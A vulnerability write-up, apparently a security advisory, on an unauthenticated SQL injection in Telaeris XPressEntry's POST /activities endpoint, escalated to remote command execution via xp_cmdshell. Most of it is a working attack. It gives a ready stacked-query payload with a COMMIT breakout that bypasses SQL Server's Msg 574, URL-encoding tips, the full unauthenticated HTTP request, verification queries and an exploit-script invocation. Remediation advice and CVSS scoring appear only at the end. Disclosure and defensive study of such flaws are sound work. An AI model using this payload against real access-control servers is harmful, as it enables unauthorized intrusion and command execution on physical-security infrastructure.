# Telaeris XPressEntry Unauthenticated SQL Injection RCE — Full Technical Analysis

## Product Background

- **Vendor**: Telaeris Inc (California, US; DoD contractor)
- **Product**: XPressEntry v3.7.7454
- **Category**: access control / muster / badge-reader management (physical security)
- **Stack**: Windows x64, .NET Framework 4.7.2, WCF WebHttp
- **Service**: `XPressEntryService.exe` runs as **LocalSystem**, AUTO_START
- **Database**: SQLite (default/small) / SQL Server (enterprise/DoD) / MySQL, selected by `g_iConnType` (SQLITE=0, MYSQL=1, SQLSERVER=4)
- **HTTP**: 30000 (HTTP) + 30001 (HTTPS) = same `cXPEWebService` WCF WebHttp ServiceHost, bound 0.0.0.0:30000

## Stage 0 — Authentication Boundary

Auth model (`XPressEntryHTTPAPI.cs:592`): when `RequireReaderCredentials=False` (LIVE-confirmed, also in settings table), **all routes** except `/reader_setup` automatically get `credentialResponse = VALID` → the entire main HTTP API is unauthenticated.

LIVE confirmation: `POST /activities` with no credentials returns `200 success`.

## Stage 1 — Sink Identification

`SaveVerifyActivity` (`cXPEServiceHost.cs:4657-4727`), INSERT at `:4682`:

```csharp
sSQL = "INSERT INTO verify_activities (badge_no,user_id,entry_granted,reader_id,zone_id,timestamp,notes,created_at,updated_at) VALUES ('" + sBadgeNo + "'," + Conversions.ToString(iUserID) + "," + Conversions.ToString(num) + "," + Conversions.ToString(iReaderID) + "," + Conversions.ToString(iZoneID) + ",'" + sUnixTimeStamp + "','" + sNotes + "'," + text + "," + text + ");";
```

- `sNotes` is raw string concatenation (no parameterization, no escaping) → injection point
- `text = "'" + DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss") + "'"` (created_at/updated_at)
- Early-return gate (`:4661`): `if (iReaderID == -1) | (sUnixTimeStamp.Length < 19)` → need reader_id ≠ -1 and timestamp ≥ 19 chars
- Dedup gate (`:4668`): `DoRecordsExist` (LIMIT 1, SQL Server TOP) → badge_no must be unique (script uses uuid)

## Stage 2 — Source Identification

`POST /activities` processing:
1. Handler splits body on `\r`, filters lines with `Trim().Length>=20` → `AddHandheldActivityRecordsToQueue`
2. `InsertLineIntoActivityQueue` (**parameterized** INSERT, no SQLi) → writes `activity_queue` table
3. Queue timer (10000ms due/period; `tmr_activityQueue.Change(1,5)` after enqueue → fires 5ms later) → `ProcessNextActivityQueueIfPossible`
4. Dequeue (TOP syntax) → `HandleHandheldActivityRecord` delegate → `ParseActivityRequest` → routes by `sActivityType` → `SaveVerifyActivity` (SQLi sink)

`ParseActivityRequest` gate (`cXPEServiceHost.cs:2762-2774`): for non-"all_lists" requests:
```sql
SELECT TOP 1 companies.name AS company, <GetSQLForFullName> AS user_name, badges.id AS badge_id
FROM users LEFT JOIN companies ON companies.id=users.company_id
LEFT JOIN badges ON badges.user_id=users.id
WHERE badges.badge_no=@badge_no AND users.id=@user_id AND badges.deleted_at IS NULL
```
- 0 rows returned → `bParseSuccess` stays true → `SaveVerifyActivity` still executes (SQLi fires)
- null (query exception) → `bParseSuccess=false` → sink not reached

**Source → Sink mapping**: HTTP body `message_content` → `sMessage` (`:2790`) → `SaveVerifyActivity` `sNotes` param (`:3075` sole caller) → INSERT concat.

## Stage 3 — Data Flow (transaction context — key)

Queue processor (`cActivityQueueProcessing.cs:380-432`):
- `:380` `BeginTransaction` (ReadCommitted)
- `:384-413` delegate call (includes `SaveVerifyActivity` SQLi)
- `:414-415` DELETE (dequeue)
- `:428-432` `Commit`

→ **The SQLi executes inside a user transaction** (`ExecuteNonQuery(batch, conn, trans)`).

## Stage 4 — Injection / Exploitation Construction (COMMIT-breakout bypasses Msg 574)

### Blocker: Msg 574
Standard xp_cmdshell enable: `EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;`. But `RECONFIGURE` is a CONFIG statement; SQL Server rejects it inside a user transaction:
> **Msg 574, Level 16: "CONFIG statement cannot be used inside a user transaction."**

Confirmed: inside a transaction, `sp_configure/RECONFIGURE` → 574, xp_cmdshell stays 0.

### Bypass: COMMIT-breakout
Issue `COMMIT;` first in the batch to end the queue transaction; then `RECONFIGURE` runs **outside** the transaction → Msg 574 no longer applies → xp_cmdshell enabled.

**Payload** (injected into `sNotes` / HTTP `message_content`):
```
x','2026-07-23 00:00:00','2026-07-23 00:00:00'); COMMIT; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; CREATE TABLE xpe_rce_out (id INT IDENTITY(1,1), line NVARCHAR(MAX)); INSERT INTO xpe_rce_out(line) EXEC xp_cmdshell 'whoami'; EXEC xp_cmdshell 'echo XPE_HTTP_RCE_OK > C:\Windows\Temp\xpe_http_rce_marker.txt'; -- 
```

Breakout parsing: `sNotes` = `x','<ts>','<ts>'); <stacked>; -- `
- `x'` closes the sNotes string
- `,'<ts>','<ts>')` completes created_at/updated_at + closes the VALUES paren + `;`
- `<stacked>` = COMMIT + RECONFIGURE + xp_cmdshell
- `-- ` comments out the original statement tail

**Encoding key**: spaces must be `%20`-encoded. The server's URL decoder treats `+` literally (LIVE-tested: `+` encoding caused a T-SQL `+COMMIT` syntax error). Use `urllib.parse.quote(safe='')` rather than `urlencode`/`quote_plus`.

## Stage 5 — Dynamic Verification (real HTTP request + response + evidence)

### Request
```
POST /activities HTTP/1.1
Host: 127.0.0.1:30000
Content-Type: application/x-www-form-urlencoded

request=verify&badge_no=RCE628eb84f7a&user_id=1&reader_id=1&zone_id=1&timestamp=2026-07-23%2000%3A00%3A00&message_content=<url-encoded breakout payload>
```
(no Authorization / Cookie or any credential)

### Response
```
HTTP/1.1 200 OK
success : 2026-07-24 00:23:13.103&versions_hash=1B2M2Y8AsgTpgAmY7PhCfg==
```

### Target-side verification (SQL Server, after queue processor fires)
1. **xp_cmdshell enabled**:
   ```sql
   SELECT CAST(value_in_use AS INT) AS xp FROM sys.configurations WHERE name='xp_cmdshell';
   -- xp = 1  (0 before injection)
   ```
2. **Command output captured** (whoami):
   ```sql
   SELECT line FROM xpe_rce_out WHERE line IS NOT NULL;
   -- line = nt service\mssql$sqlexpress
   ```
3. **File write** (xp_cmdshell echo):
   ```
   C:\Windows\Temp\xpe_http_rce_marker.txt content = XPE_HTTP_RCE_OK
   ```

**RCE identity**: `NT Service\MSSQL$SQLEXPRESS` (SQL Server service account, low-privilege virtual account).

## Stage 6 — Reachability (default config + prerequisites)

- **Unauthenticated**: `RequireReaderCredentials=False` → entire main HTTP API requires no auth (LIVE-confirmed)
- **SQLi config-independent**: the raw `sNotes` concat is a DB-independent code defect, present on SQLite/SQL Server/MySQL backends (LIVE-triggered on SQL Server)
- **RCE upgrade prerequisite**: SQL Server backend (common in enterprise/DoD deployments, `DB_TYPES.SQLSERVER=4`) + app connection account is sysadmin (for sp_configure to enable xp_cmdshell)
- **SQLite default backend**: SQLi still allows unauthenticated data exfiltration + arbitrary table/data writes (no xp_cmdshell RCE)

## Stage 7 — Defense in Depth / Remediation

1. **Parameterize sNotes**: `SaveVerifyActivity`'s INSERT should use `DbParameter` parameterization (same as `InsertLineIntoActivityQueue`), eliminating concatenation
2. **Least privilege**: the app's SQL Server account must not be sysadmin; use least-privilege + deny `xp_cmdshell`/`sp_configure`
3. **Disable xp_cmdshell by default**: keep `xp_cmdshell=0` and restrict `sp_configure` permissions
4. **Enforce auth**: `RequireReaderCredentials` should default to True, or enforce auth on all write endpoints
5. **Input validation**: whitelist `message_content` length/charset before queue insertion

## Reproduction

```bash
# from a host that can reach port 30000
python3 exploit.py <target_ip> 30000 whoami
# verify (target SQL Server, any sysadmin account):
#   sqlcmd -S .\SQLEXPRESS -E -d XPressEntry -Q "SELECT CAST(value_in_use AS INT) AS xp FROM sys.configurations WHERE name='xp_cmdshell'; SELECT line FROM xpe_rce_out WHERE line IS NOT NULL;"
#   type C:\Windows\Temp\xpe_http_rce_marker.txt
```

## CWE / CVSS

- CWE-89 (SQL Injection) — raw `sNotes` concat in `SaveVerifyActivity`
- CWE-306 (Missing Authentication) — `RequireReaderCredentials=False` default
- CWE-78 (OS Command Injection) — xp_cmdshell execution
- **CVSS 3.1**: ≈ 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) — PR:N because the main API is unauthenticated by default
